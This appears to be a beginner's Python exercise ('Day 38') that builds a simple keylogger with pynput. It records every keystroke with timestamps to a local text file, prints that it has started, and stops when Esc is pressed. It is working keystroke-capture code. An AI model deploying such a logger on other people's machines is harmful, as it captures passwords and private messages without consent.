# Day 38: Learning about Keyboard Event Listening
# Goal: Create a tool that logs keystrokes into a file (For Security Testing)

import pynput.keyboard
import logging

#Log file save & fix format 
log_file = r"C:\Users\MyPlusComputers\Documents\key_log.txt"

logging.basicConfig(filename=log_file,
                    level = logging.DEBUG,
                    format = '%(asctime)s: %(message)s')

def on_press(key):
    try:
        #normal numbers and log numbers
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        #Special keys (Space, Enter, Ctrl) logging
        logging.info(f"Special key pressed: {key}")


def on_release(key):
    # If aniyone pressing'Esc', the program will be stop. 
    if key == pynput.keyboard.Key.esc:
        return False
    
#Starting the Listerner
print("[*] Keylogger started... Press 'Esc' to stop.")
with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

     